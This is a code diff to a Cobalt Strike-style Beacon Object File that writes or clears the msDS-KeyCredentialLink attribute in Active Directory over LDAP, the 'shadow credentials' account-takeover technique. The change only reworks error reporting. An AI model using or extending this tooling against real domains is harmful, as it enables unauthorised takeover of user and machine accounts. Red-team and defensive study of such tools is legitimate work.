@@ -136,13 +136,15 @@ void go(char *args, int alen)
     clear = bof_stricmp(blobarg, "remove") == 0 ||
             bof_stricmp(blobarg, "clear") == 0;
 
-    ld = bof_ldap_open();
+    ld = bof_ldap_open_ex(&rc);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR, "LDAP connect/bind failed\n");
+        bof_error_ldap("ldap_init/bind", rc,
+                       "cannot reach or authenticate to a domain controller");
         return;
     }
-    if (bof_ldap_default_nc(ld, base, sizeof(base)) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "could not read defaultNamingContext\n");
+    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
+        bof_error_ldap("rootDSE defaultNamingContext", rc,
+                       "cannot read the domain naming context");
         WLDAP32$ldap_unbind(ld);
         return;
     }
@@ -242,9 +244,11 @@ void go(char *args, int alen)
     rc = bof_ldap_write_bin(ld, dn, "msDS-KeyCredentialLink", blob, bloblen);
     if (rc == LDAP_SUCCESS)
         BeaconPrintf(CALLBACK_OUTPUT, "[+] msDS-KeyCredentialLink written\n");
-    else
-        BeaconPrintf(CALLBACK_ERROR, "ldap modify failed: %lu (%s)\n",
-                     (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
+    else {
+        bof_error_ldap("ldap_modify", rc,
+                       "the directory rejected the attribute update");
+        bof_error_context("dn", dn);
+    }
 
 done:
     if (blob) {
